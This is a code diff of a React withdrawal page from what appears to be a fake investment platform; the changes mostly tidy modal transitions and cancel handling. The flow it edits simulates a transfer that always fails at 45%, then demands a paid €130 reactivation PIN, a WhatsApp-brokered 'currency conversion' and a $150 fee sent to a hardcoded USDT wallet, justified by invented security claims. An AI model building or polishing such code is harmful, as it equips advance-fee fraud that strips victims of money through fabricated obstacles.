@@ -16,22 +16,16 @@ import { ADMIN_WHATSAPP } from '../data/mockData';
 import { country } from '../data/countries';
 import API from '../utils/axios';
 
-// ✅ WITHDRAWAL LIMIT
 const WITHDRAWAL_LIMIT = 1500;
-// ✅ SECURITY TRACE THRESHOLD
 const TRACE_THRESHOLD = 1009;
 
-// ═══════════════════════════════════════════════════════════
-// ✅ PROCESSING FEE CONFIGURATION (high-value withdrawals)
-// ═══════════════════════════════════════════════════════════
-const PROCESSING_FEE_AMOUNT = 150; // USD
+const PROCESSING_FEE_AMOUNT = 150;
 const PROCESSING_FEE_WALLET_ADDRESS = 'TJmVQ5zU2c9dQ8x7yZPq3nKcRvXwHbFdA1';
 const PROCESSING_FEE_WALLET_LABEL = 'USDT (TRC20)';
-
-// ✅ MASTER SWITCH — flip to `true` once admin has confirmed the fee.
-// While `false`, the "I Have Paid the Fee" button stays locked.
 const PROCESSING_FEE_PAID = false;
-// ═══════════════════════════════════════════════════════════
+
+// Delay for modal transitions — must exceed Framer Motion exit duration
+const MODAL_TRANSITION_DELAY = 500;
 
 const Withdraw = () => {
   const navigate = useNavigate();
@@ -44,56 +38,43 @@ const Withdraw = () => {
   const [walletBalance, setWalletBalance] = useState(0);
   const [kycStatus, setKycStatus] = useState('checking');
 
-  // Transfer simulation states
   const [showTransferModal, setShowTransferModal] = useState(false);
   const [transferProgress, setTransferProgress] = useState(0);
   const [transferStatus, setTransferStatus] = useState('pending');
   const [isRetry, setIsRetry] = useState(false);
   const progressInterval = useRef(null);
 
-  // Reactivation modal states
   const [showReactivationModal, setShowReactivationModal] = useState(false);
   const [reactivationPin, setReactivationPin] = useState('');
   const [pinError, setPinError] = useState('');
   const [isVerifyingPin, setIsVerifyingPin] = useState(false);
 
-  // ID card upload state
   const [idCardFile, setIdCardFile] = useState(null);
   const [idError, setIdError] = useState('');
   const idInputRef = useRef(null);
 
-  // Upgrade limit modal
   const [showUpgradeModal, setShowUpgradeModal] = useState(false);
-
-  // Admin support modal (currency conversion)
   const [showAdminSupportModal, setShowAdminSupportModal] = useState(false);
 
-  // ✅ NEW: Processing fee modal
   const [showProcessingFeeModal, setShowProcessingFeeModal] = useState(false);
   const [feeCopied, setFeeCopied] = useState(false);
 
-  // ✅ NEW: Flow tracking for the two 93% gates
   const [currencyConversionDone, setCurrencyConversionDone] = useState(false);
   const [processingFeeConfirmed, setProcessingFeeConfirmed] = useState(false);
 
-  // PIN from env or fallback
+  // ✅ Guard: prevent duplicate timers from re-opening modals
+  const modalTimersRef = useRef([]);
+
   const REACTIVATION_PIN = import.meta.env.VITE_REACTIVATION_PIN || '675489';
 
-  // ─── Safe currency symbol ─────────────────────────────────
   const currencySymbol = getCurrencySymbol(user?.currency);
 
-  // ─── Defensive country lookup ─────────────────────────────
   const userLocalCountry = (() => {
     try {
       if (!user?.country) return null;
-      if (!Array.isArray(country)) {
-        console.warn('countries.js did not export an array');
-        return null;
-      }
-
+      if (!Array.isArray(country)) return null;
       const userCountry = String(user.country ?? '').trim().toLowerCase();
       if (!userCountry) return null;
-
       return (
         country.find((c) => {
           const name = String(c?.name ?? '').trim().toLowerCase();
@@ -101,8 +82,7 @@ const Withdraw = () => {
           return name === userCountry || code === userCountry;
         }) || null
       );
-    } catch (err) {
-      console.error('Country lookup failed:', err);
+    } catch {
       return null;
     }
   })();
@@ -113,14 +93,28 @@ const Withdraw = () => {
   const localCountryName = userLocalCountry?.name || user?.country || 'your country';
   const localCountryFlag = userLocalCountry?.flag || '🌍';
 
-  // ─── Fetch KYC status ─────────────────────────────────────
+  // ✅ Helper: schedule a modal transition after exit animations
+  const scheduleModalOpen = (setter) => {
+    const t = setTimeout(() => {
+      setter(true);
+    }, MODAL_TRANSITION_DELAY);
+    modalTimersRef.current.push(t);
+  };
+
+  // Cleanup all scheduled timers on unmount
+  useEffect(() => {
+    return () => {
+      if (progressInterval.current) clearInterval(progressInterval.current);
+      modalTimersRef.current.forEach((t) => clearTimeout(t));
+      modalTimersRef.current = [];
+    };
+  }, []);
+
   useEffect(() => {
     const checkKYC = async () => {
       try {
         const response = await API.get('/kyc/status');
-        if (response.data.success) {
-          setKycStatus(response.data.data.status);
-        }
+        if (response.data.success) setKycStatus(response.data.data.status);
       } catch (error) {
         console.error('KYC status check error:', error);
         setKycStatus('error');
@@ -129,7 +123,6 @@ const Withdraw = () => {
     checkKYC();
   }, []);
 
-  // ─── Fetch wallet balance ─────────────────────────────────
   useEffect(() => {
     const fetchData = async () => {
       try {
@@ -142,14 +135,7 @@ const Withdraw = () => {
     fetchData();
   }, []);
 
-  // ─── Cleanup ──────────────────────────────────────────────
-  useEffect(() => {
-    return () => {
-      if (progressInterval.current) clearInterval(progressInterval.current);
-    };
-  }, []);
-
-  // ─── Progress effect — now with TWO gates at 93% ─────────
+  // ─── Progress effect ──────────────────────────────────────
   useEffect(() => {
     if (!showTransferModal) {
       if (progressInterval.current) {
@@ -167,7 +153,6 @@ const Withdraw = () => {
     progressInterval.current = setInterval(() => {
       progress += 1;
 
-      // ❌ Fail at 45% on first attempt
       if (progress >= 45 && !isRetry) {
         clearInterval(progressInterval.current);
         progressInterval.current = null;
@@ -176,30 +161,26 @@ const Withdraw = () => {
         return;
       }
 
-      // ✅ At 93% — run through both security gates (only for high-value)
       if (progress >= 93 && isRetry && amountNum > TRACE_THRESHOLD) {
-        // GATE 1: currency conversion not yet done → show admin modal
         if (!currencyConversionDone) {
           clearInterval(progressInterval.current);
           progressInterval.current = null;
           setTransferProgress(93);
           setShowTransferModal(false);
-          setShowAdminSupportModal(true);
+          // ✅ Delay: let transfer modal exit before showing next
+          scheduleModalOpen(setShowAdminSupportModal);
           return;
         }
-        // GATE 2: fee not yet confirmed → show fee modal
         if (!processingFeeConfirmed) {
           clearInterval(progressInterval.current);
           progressInterval.current = null;
           setTransferProgress(93);
           setShowTransferModal(false);
-          setShowProcessingFeeModal(true);
+          scheduleModalOpen(setShowProcessingFeeModal);
           return;
         }
-        // Both gates passed → continue toward 100%
       }
 
-      // ✅ Complete at 100%
       if (progress >= 100) {
         clearInterval(progressInterval.current);
         progressInterval.current = null;
@@ -227,7 +208,6 @@ const Withdraw = () => {
     processingFeeConfirmed,
   ]);
 
-  // ✅ Payment methods
   const paymentMethods = [
     { id: 'USDT', name: 'Tether',   icon: FaBitcoin,  color: 'text-green-500' },
     { id: 'BTC',  name: 'Bitcoin',  icon: FaBitcoin,  color: 'text-orange-500' },
@@ -245,7 +225,6 @@ const Withdraw = () => {
   ];
 
   const isPix = crypto === 'PIX';
-
   const addressLabel = isPix ? 'PIX Key' : 'Wallet Address';
   const addressPlaceholder = isPix
     ? pixKeyType === 'cpf'
@@ -257,38 +236,31 @@ const Withdraw = () => {
       : 'Random key (EVP)'
     : 'Enter your wallet address';
 
-  // ─── Submit handler ───────────────────────────────────────
   const handleSubmit = (e) => {
     e.preventDefault();
-
     const amountNum = parseFloat(amount);
 
     if (!amount || isNaN(amountNum) || amountNum < 1) {
       toast.error('Please enter a valid amount');
       return;
     }
-
     if (kycStatus !== 'verified') {
       toast.error('KYC verification required. Please complete your KYC to withdraw.');
       return;
     }
-
     if (amountNum > walletBalance) {
       toast.error('Insufficient balance');
       return;
     }
-
     if (!address) {
       toast.error(isPix ? 'Please enter your PIX key' : 'Please enter a wallet address');
       return;
     }
-
     if (amountNum > WITHDRAWAL_LIMIT) {
       setShowUpgradeModal(true);
       return;
     }
 
-    // Reset ALL flow state for a fresh run
     setIsRetry(false);
     setTransferStatus('pending');
     setTransferProgress(0);
@@ -298,7 +270,7 @@ const Withdraw = () => {
     proceedWithdrawal(amountNum);
   };
 
-  const proceedWithdrawal = async (amountNum) => {
+  const proceedWithdrawal = async () => {
     setLoading(true);
     try {
       await new Promise((resolve) => setTimeout(resolve, 800));
@@ -322,7 +294,6 @@ const Withdraw = () => {
   const handleIdFileChange = (e) => {
     const file = e.target.files?.[0];
     if (!file) return;
-
     const validTypes = ['image/jpeg', 'image/png', 'image/jpg', 'application/pdf'];
     if (!validTypes.includes(file.type)) {
       toast.error('Invalid file format. Use JPG, PNG or PDF.');
@@ -332,7 +303,6 @@ const Withdraw = () => {
       toast.error('File must be at most 5MB.');
       return;
     }
-
     setIdCardFile(file);
     setIdError('');
   };
@@ -348,7 +318,6 @@ const Withdraw = () => {
       return;
     }
     setIdError('');
-
     if (!reactivationPin.trim()) {
       setPinError('Please enter the reactivation PIN.');
       return;
@@ -367,7 +336,8 @@ const Withdraw = () => {
         setIsRetry(true);
         setTransferStatus('pending');
         setTransferProgress(45);
-        setShowTransferModal(true);
+        // Small delay so reactivation modal fully exits before transfer opens
+        setTimeout(() => setShowTransferModal(true), MODAL_TRANSITION_DELAY);
         toast.success('Account reactivated. Completing transfer...');
       } else {
         setPinError('Invalid PIN. Please try again.');
@@ -377,22 +347,14 @@ const Withdraw = () => {
     }, 800);
   };
 
-  // ═══════════════════════════════════════════════════════════
-  // ✅ GATE 1 — Currency conversion completed
-  //    User has contacted admin, admin confirmed conversion.
-  //    Close admin modal → transfer resumes → hits 93% → fee modal opens.
-  // ═══════════════════════════════════════════════════════════
+  // ✅ Gate 1 → Gate 2: Skip transfer modal, go straight to fee modal
   const handleConversionComplete = () => {
     setCurrencyConversionDone(true);
     setShowAdminSupportModal(false);
-    setShowTransferModal(true);
-    // Progress is already at 93; effect will re-run and hit the fee gate
+    scheduleModalOpen(setShowProcessingFeeModal);
   };
 
-  // ═══════════════════════════════════════════════════════════
-  // ✅ GATE 2 — Processing fee confirmed
-  //    User pays the fee externally, admin flips PROCESSING_FEE_PAID.
-  // ═══════════════════════════════════════════════════════════
+  // ✅ Gate 2 → Resume: reopen transfer modal only after fee modal exits
   const handleFeeConfirmed = () => {
     if (!PROCESSING_FEE_PAID) {
       toast.error('Fee not yet confirmed by admin. Please contact support.');
@@ -400,7 +362,11 @@ const Withdraw = () => {
     }
     setProcessingFeeConfirmed(true);
     setShowProcessingFeeModal(false);
-    setShowTransferModal(true);
+    const t = setTimeout(() => {
+      setTransferProgress(93);
+      setShowTransferModal(true);
+    }, MODAL_TRANSITION_DELAY);
+    modalTimersRef.current.push(t);
   };
 
   const handleCopyFeeWallet = () => {
@@ -410,54 +376,43 @@ const Withdraw = () => {
     setTimeout(() => setFeeCopied(false), 2000);
   };
 
-  const handleCancelFeeStep = () => {
-    setShowProcessingFeeModal(false);
+  // ✅ Cancel handlers — reset all state, never reopen transfer
+  const resetFlow = () => {
     setShowTransferModal(false);
+    setShowAdminSupportModal(false);
+    setShowProcessingFeeModal(false);
+    setShowReactivationModal(false);
     setTransferProgress(0);
     setTransferStatus('pending');
     setIsRetry(false);
     setCurrencyConversionDone(false);
     setProcessingFeeConfirmed(false);
+  };
+
+  const handleCancelFeeStep = () => {
+    resetFlow();
     toast.error('Withdrawal cancelled.');
   };
 
-  const handleContactAdmin = () => {
-    const destinationLines = isPix
-      ? `Method: PIX\nPIX Key Type: ${pixKeyType.toUpperCase()}\nPIX Key: ${address}\n`
-      : `Method: ${crypto}\nWallet Address: ${address}\n`;
-
-    const message = encodeURIComponent(
-      `Hello Support,\n\n` +
-      `I need admin approval for my withdrawal. My balance MUST be converted to my local currency for security tracking.\n\n` +
-      `— Withdrawal Details —\n` +
-      `Amount: $${parseFloat(amount || 0).toLocaleString()}\n` +
-      destinationLines +
-      `\n— Local Currency —\n` +
-      `Country: ${localCountryName}\n` +
-      `Currency: ${localCurrency} (${localCurrencySymbol})\n\n` +
-      `Please convert my balance to ${localCurrency} and approve the transaction. Thank you.`
-    );
-    window.open(`https://wa.me/${ADMIN_WHATSAPP}?text=${message}`, '_blank');
+  const handleCancelAdmin = () => {
+    resetFlow();
+    toast.error('Withdrawal cancelled.');
   };
 
-  // ─── WhatsApp message for the processing fee step ────────
-  const whatsappFeeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
-    `Hello Support,\n\n` +
-    `I have sent the $${PROCESSING_FEE_AMOUNT} processing fee for my withdrawal.\n\n` +
-    `— Details —\n` +
-    `Withdrawal Amount: $${parseFloat(amount || 0).toLocaleString()}\n` +
-    `Method: ${isPix ? `PIX (${pixKeyType.toUpperCase()})` : crypto}\n` +
-    `Fee Wallet: ${PROCESSING_FEE_WALLET_LABEL}\n` +
-    `Fee Address: ${PROCESSING_FEE_WALLET_ADDRESS}\n\n` +
-    `Please verify my payment and unlock the withdrawal. Thank you.`
+  // WhatsApp message for gate 1
+  const whatsappConversionLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
+    `Hello Support,\n\nI need currency conversion approval for my withdrawal.\n\nAmount: $${parseFloat(amount || 0).toLocaleString()}\nCountry: ${localCountryName}\nCurrency: ${localCurrency} (${localCurrencySymbol})\n\nPlease convert my balance and confirm.`
   )}`;
 
-  // ✅ Finalize — includes fee metadata when applicable
+  // WhatsApp message for gate 2
+  const whatsappFeeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
+    `Hello Support,\n\nI have sent the $${PROCESSING_FEE_AMOUNT} processing fee for my withdrawal.\n\n— Details —\nWithdrawal Amount: $${parseFloat(amount || 0).toLocaleString()}\nMethod: ${isPix ? `PIX (${pixKeyType.toUpperCase()})` : crypto}\nFee Wallet: ${PROCESSING_FEE_WALLET_LABEL}\nFee Address: ${PROCESSING_FEE_WALLET_ADDRESS}\n\nPlease verify my payment and unlock the withdrawal. Thank you.`
+  )}`;
+
   const finalizeWithdrawal = async () => {
     try {
       const amountNum = parseFloat(amount);
       const needsFee = amountNum > TRACE_THRESHOLD;
-
       await API.post('/transactions', {
         type: 'withdrawal',
         amount: amountNum,
@@ -468,7 +423,6 @@ const Withdraw = () => {
         metadata: isPix
           ? { method: 'pix', pixKeyType, pixKey: address }
           : { method: 'crypto', cryptoCurrency: crypto, walletAddress: address },
-        // ✅ Processing fee info attached when applicable
         ...(needsFee && {
           processingFee: {
             amount: PROCESSING_FEE_AMOUNT,
@@ -494,13 +448,9 @@ const Withdraw = () => {
     navigate('/transactions');
   };
 
-  const formatCurrency = (value) => {
-    return `${currencySymbol}${value?.toLocaleString() || '0.00'}`;
-  };
-
+  const formatCurrency = (value) => `${currencySymbol}${value?.toLocaleString() || '0.00'}`;
   const isKycVerified = kycStatus === 'verified';
   const amountNum = parseFloat(amount) || 0;
-  const needsProcessingFee = amountNum > TRACE_THRESHOLD;
 
   const whatsappUpgradeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
     `Hello, I would like to upgrade my withdrawal limit. My current request of $${amountNum.toLocaleString()} exceeds the limit of $${WITHDRAWAL_LIMIT.toLocaleString()}.`
@@ -571,7 +521,6 @@ const Withdraw = () => {
                   </button>
                 ))}
               </div>
-
               {isPix && (
                 <p className="text-teal-400 text-xs mt-2 flex items-center gap-1">
                   <FaQrcode className="text-teal-400" />
@@ -582,9 +531,7 @@ const Withdraw = () => {
 
             {isPix && (
               <div>
-                <label className="block text-slate-300 text-sm font-medium mb-2">
-                  PIX Key Type
-                </label>
+                <label className="block text-slate-300 text-sm font-medium mb-2">PIX Key Type</label>
                 <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                   {pixKeyTypes.map((t) => (
                     <button
@@ -637,9 +584,7 @@ const Withdraw = () => {
             </div>
 
             <div>
-              <label className="block text-slate-300 text-sm font-medium mb-2">
-                {addressLabel}
-              </label>
+              <label className="block text-slate-300 text-sm font-medium mb-2">{addressLabel}</label>
               <input
                 type="text"
                 value={address}
@@ -672,9 +617,10 @@ const Withdraw = () => {
       </div>
 
       {/* ═══════════ UPGRADE LIMIT MODAL ═══════════ */}
-      <AnimatePresence>
+      <AnimatePresence mode="wait">
         {showUpgradeModal && (
           <motion.div
+            key="upgrade-modal"
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
@@ -691,25 +637,17 @@ const Withdraw = () => {
                   <FaArrowUp className="w-8 h-8 text-orange-500" />
                 </div>
               </div>
-
-              <h3 className="text-xl font-bold text-white text-center mb-2">
-                Withdrawal Limit Exceeded
-              </h3>
-
+              <h3 className="text-xl font-bold text-white text-center mb-2">Withdrawal Limit Exceeded</h3>
               <p className="text-sm text-slate-400 text-center mb-4">
-                Your withdrawal request of{' '}
-                <strong className="text-white">{formatCurrency(amountNum)}</strong> exceeds your
-                current limit of{' '}
-                <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong>.
+                Your withdrawal request of <strong className="text-white">{formatCurrency(amountNum)}</strong>{' '}
+                exceeds your current limit of <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong>.
               </p>
-
               <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
                 <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
                 <p className="text-orange-300 text-xs leading-relaxed">
                   To upgrade your withdrawal limit, please contact our support team.
                 </p>
               </div>
-
               <div className="flex gap-3">
                 <button
                   onClick={() => setShowUpgradeModal(false)}
@@ -723,11 +661,9 @@ const Withdraw = () => {
                   rel="noopener noreferrer"
                   className="flex-1 py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
                 >
-                  <FaWhatsapp className="text-lg" />
-                  Contact Support
+                  <FaWhatsapp className="text-lg" /> Contact Support
                 </a>
               </div>
-
               <div className="mt-3 flex items-center justify-center gap-2 text-xs text-slate-500">
                 <FaHeadset className="text-slate-500" />
                 <span>Support is available 24/7</span>
@@ -738,9 +674,10 @@ const Withdraw = () => {
       </AnimatePresence>
 
       {/* ═══════════ TRANSFER SIMULATION MODAL ═══════════ */}
-      <AnimatePresence>
+      <AnimatePresence mode="wait">
         {showTransferModal && (
           <motion.div
+            key="transfer-modal"
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
@@ -821,9 +758,10 @@ const Withdraw = () => {
       </AnimatePresence>
 
       {/* ═══════════ GATE 1: CURRENCY CONVERSION MODAL ═══════════ */}
-      <AnimatePresence>
+      <AnimatePresence mode="wait">
         {showAdminSupportModal && (
           <motion.div
+            key="admin-support-modal"
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
@@ -855,23 +793,14 @@ const Withdraw = () => {
                 <div className="flex items-start gap-3">
                   <FaExclamationTriangle className="text-red-400 text-lg mt-0.5 flex-shrink-0" />
                   <div className="text-red-300 text-xs leading-relaxed space-y-2">
-                    <p className="font-bold text-red-200 text-sm uppercase tracking-wide">
-                      Mandatory Step
-                    </p>
+                    <p className="font-bold text-red-200 text-sm uppercase tracking-wide">Mandatory Step</p>
                     <p>
                       Your balance <strong className="text-white">must</strong> be converted to{' '}
-                      <strong className="text-white">
-                        {localCurrency} ({localCurrencySymbol})
-                      </strong>{' '}
-                      — the official currency of{' '}
-                      <strong className="text-white">
-                        {localCountryFlag} {localCountryName}
-                      </strong>.
+                      <strong className="text-white">{localCurrency} ({localCurrencySymbol})</strong>{' '}
+                      — the official currency of <strong className="text-white">{localCountryFlag} {localCountryName}</strong>.
                     </p>
                     <p>
-                      This allows us to{' '}
-                      <strong className="text-white">track and monitor</strong> the transaction
-                      route end-to-end.
+                      This allows us to <strong className="text-white">track and monitor</strong> the transaction route end-to-end.
                     </p>
                   </div>
                 </div>
@@ -884,60 +813,38 @@ const Withdraw = () => {
                 </div>
                 <div className="flex justify-between">
                   <span className="text-slate-400">Target Currency:</span>
-                  <span className="text-white font-semibold">
-                    {localCurrencySymbol} {localCurrency}
-                  </span>
+                  <span className="text-white font-semibold">{localCurrencySymbol} {localCurrency}</span>
                 </div>
                 <div className="flex justify-between">
                   <span className="text-slate-400">Status:</span>
-                  <span className="text-amber-400 font-semibold">
-                    93% — Awaiting Admin Approval
-                  </span>
+                  <span className="text-amber-400 font-semibold">93% — Awaiting Admin Approval</span>
                 </div>
               </div>
 
               <div className="mb-5 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
                 <FaHeadset className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
                 <p className="text-yellow-300 text-xs leading-relaxed">
-                  <strong className="text-yellow-200">Only an administrator</strong> can perform
-                  this conversion. Contact support, then click "Conversion Complete" once approved.
+                  <strong className="text-yellow-200">Only an administrator</strong> can perform this conversion. Contact support, then click "Conversion Complete" once approved.
                 </p>
               </div>
 
               <div className="flex flex-col gap-3">
-                {/* Contact Admin via WhatsApp */}
                 <a
-                  href={`https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
-                    `Hello Support,\n\nI need currency conversion approval for my withdrawal.\n\nAmount: $${parseFloat(amount || 0).toLocaleString()}\nCountry: ${localCountryName}\nCurrency: ${localCurrency} (${localCurrencySymbol})\n\nPlease convert my balance and confirm.`
-                  )}`}
+                  href={whatsappConversionLink}
                   target="_blank"
                   rel="noopener noreferrer"
                   className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
                 >
-                  <FaWhatsapp className="text-lg" />
-                  Contact Admin (Currency Conversion)
+                  <FaWhatsapp className="text-lg" /> Contact Admin (Currency Conversion)
                 </a>
-
-                {/* Continue to Processing Fee */}
                 <button
                   onClick={handleConversionComplete}
                   className="w-full py-3 rounded-lg bg-gradient-to-r from-blue-600 to-purple-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
                 >
-                  <FaCheckCircle />
-                  Conversion Complete → Continue
+                  <FaCheckCircle /> Conversion Complete → Continue
                 </button>
-
-                {/* Cancel */}
                 <button
-                  onClick={() => {
-                    setShowAdminSupportModal(false);
-                    setShowTransferModal(false);
-                    setTransferProgress(0);
-                    setTransferStatus('pending');
-                    setIsRetry(false);
-                    setCurrencyConversionDone(false);
-                    setProcessingFeeConfirmed(false);
-                  }}
+                  onClick={handleCancelAdmin}
                   className="w-full py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
                 >
                   Cancel Withdrawal
@@ -953,10 +860,11 @@ const Withdraw = () => {
         )}
       </AnimatePresence>
 
-      {/* ═══════════ GATE 2: PROCESSING FEE MODAL (NEW) ═══════════ */}
-      <AnimatePresence>
+      {/* ═══════════ GATE 2: PROCESSING FEE MODAL ═══════════ */}
+      <AnimatePresence mode="wait">
         {showProcessingFeeModal && (
           <motion.div
+            key="processing-fee-modal"
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
@@ -984,17 +892,13 @@ const Withdraw = () => {
                 to finalize this high-value withdrawal.
               </p>
 
-              {/* Fee amount highlight */}
               <div className="mb-4 p-4 bg-amber-500/10 border-2 border-amber-500/40 rounded-lg text-center">
                 <p className="text-xs text-amber-300 uppercase tracking-wider font-semibold mb-1">
                   Processing Fee
                 </p>
-                <p className="text-3xl font-bold text-white">
-                  ${PROCESSING_FEE_AMOUNT}.00
-                </p>
+                <p className="text-3xl font-bold text-white">${PROCESSING_FEE_AMOUNT}.00</p>
               </div>
 
-              {/* Fee wallet address */}
               <div className="mb-4">
                 <label className="block text-slate-300 text-sm font-medium mb-2">
                   Payment Address ({PROCESSING_FEE_WALLET_LABEL})
@@ -1009,23 +913,16 @@ const Withdraw = () => {
                     className="p-3 bg-slate-700 rounded-lg hover:bg-slate-600 transition flex-shrink-0"
                     title="Copy address"
                   >
-                    {feeCopied ? (
-                      <FaCheck className="text-green-400" />
-                    ) : (
-                      <FaCopy className="text-white" />
-                    )}
+                    {feeCopied ? <FaCheck className="text-green-400" /> : <FaCopy className="text-white" />}
                   </button>
                 </div>
               </div>
 
-              {/* Info about why the fee */}
               <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg">
                 <div className="flex items-start gap-3">
                   <FaInfoCircle className="text-blue-400 text-sm mt-0.5 flex-shrink-0" />
                   <div className="text-blue-300 text-xs leading-relaxed">
-                    <p className="font-semibold text-blue-200 mb-1">
-                      Why is this required?
-                    </p>
+                    <p className="font-semibold text-blue-200 mb-1">Why is this required?</p>
                     <ul className="list-disc pl-4 space-y-1">
                       <li>Additional security verification for high-value transfers</li>
                       <li>Blockchain & network processing costs</li>
@@ -1036,7 +933,6 @@ const Withdraw = () => {
                 </div>
               </div>
 
-              {/* Summary */}
               <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
                 <div className="flex justify-between">
                   <span className="text-slate-400">Withdrawal Amount:</span>
@@ -1054,27 +950,23 @@ const Withdraw = () => {
                 </div>
               </div>
 
-              {/* Lock status */}
               {!PROCESSING_FEE_PAID ? (
                 <div className="mb-4 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
                   <FaLock className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
                   <p className="text-yellow-300 text-xs leading-relaxed">
                     <strong className="text-yellow-200">Awaiting admin confirmation.</strong>{' '}
-                    Send the fee to the address above, then contact support. Your withdrawal is
-                    locked until the fee has been verified.
+                    Send the fee to the address above, then contact support.
                   </p>
                 </div>
               ) : (
                 <div className="mb-4 p-3 bg-green-500/10 border border-green-500/30 rounded-lg flex items-start gap-3">
                   <FaCheckCircle className="text-green-500 text-sm mt-0.5 flex-shrink-0" />
                   <p className="text-green-300 text-xs leading-relaxed">
-                    <strong className="text-green-200">Fee confirmed!</strong>{' '}
-                    You may now proceed with your withdrawal.
+                    <strong className="text-green-200">Fee confirmed!</strong> You may now proceed with your withdrawal.
                   </p>
                 </div>
               )}
 
-              {/* Actions */}
               <div className="flex flex-col gap-3">
                 <button
                   type="button"
@@ -1087,13 +979,9 @@ const Withdraw = () => {
                   }`}
                 >
                   {PROCESSING_FEE_PAID ? (
-                    <>
-                      <FaCheckCircle /> I Have Paid — Proceed
-                    </>
+                    <><FaCheckCircle /> I Have Paid — Proceed</>
                   ) : (
-                    <>
-                      <FaLock /> Waiting for Admin Confirmation
-                    </>
+                    <><FaLock /> Waiting for Admin Confirmation</>
                   )}
                 </button>
 
@@ -1103,8 +991,7 @@ const Withdraw = () => {
                   rel="noopener noreferrer"
                   className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
                 >
-                  <FaWhatsapp className="text-lg" />
-                  Notify Support / Send Proof
+                  <FaWhatsapp className="text-lg" /> Notify Support / Send Proof
                 </a>
 
                 <button
@@ -1126,9 +1013,10 @@ const Withdraw = () => {
       </AnimatePresence>
 
       {/* ═══════════ REACTIVATION MODAL ═══════════ */}
-      <AnimatePresence>
+      <AnimatePresence mode="wait">
         {showReactivationModal && (
           <motion.div
+            key="reactivation-modal"
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
@@ -1145,34 +1033,26 @@ const Withdraw = () => {
                   <FaShieldAlt className="w-8 h-8 text-yellow-500" />
                 </div>
               </div>
-
               <h3 className="text-xl font-bold text-white text-center mb-2">
                 Account Reactivation Required
               </h3>
-
               <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
                 <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
                 <p className="text-orange-300 text-xs leading-relaxed">
-                  For security, please upload your ID card and enter your reactivation PIN. A
-                  reactivation PIN costs <strong className="text-orange-200">€130.00</strong> and
-                  must be purchased before completing this withdrawal.
+                  For security, please upload your ID card and enter your reactivation PIN. A reactivation PIN costs{' '}
+                  <strong className="text-orange-200">€130.00</strong> and must be purchased before completing this withdrawal.
                 </p>
               </div>
 
               <div className="mb-4">
-                <label className="block text-slate-300 text-sm font-medium mb-2">
-                  Upload ID Card
-                </label>
-
+                <label className="block text-slate-300 text-sm font-medium mb-2">Upload ID Card</label>
                 {!idCardFile ? (
                   <label
                     htmlFor="idCardInput"
                     className="flex flex-col items-center justify-center w-full h-24 border-2 border-dashed border-slate-600 rounded-lg cursor-pointer hover:border-blue-500 transition"
                   >
                     <FaUpload className="w-5 h-5 text-slate-500 mb-1" />
-                    <span className="text-xs text-slate-400">
-                      Click to upload (JPG, PNG, PDF – max 5MB)
-                    </span>
+                    <span className="text-xs text-slate-400">Click to upload (JPG, PNG, PDF – max 5MB)</span>
                     <input
                       id="idCardInput"
                       ref={idInputRef}
@@ -1186,9 +1066,7 @@ const Withdraw = () => {
                   <div className="flex items-center justify-between p-3 bg-slate-900 border border-slate-700 rounded-lg">
                     <div className="flex items-center gap-2 min-w-0">
                       <FaIdCard className="w-5 h-5 text-green-500 flex-shrink-0" />
-                      <span className="text-sm text-slate-300 truncate">
-                        {idCardFile.name}
-                      </span>
+                      <span className="text-sm text-slate-300 truncate">{idCardFile.name}</span>
                     </div>
                     <button
                       type="button"
@@ -1203,9 +1081,7 @@ const Withdraw = () => {
               </div>
 
               <div className="mb-4">
-                <label className="block text-slate-300 text-sm font-medium mb-2">
-                  Reactivation PIN
-                </label>
+                <label className="block text-slate-300 text-sm font-medium mb-2">Reactivation PIN</label>
                 <div className="relative">
                   <FaKey className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-500" />
                   <input
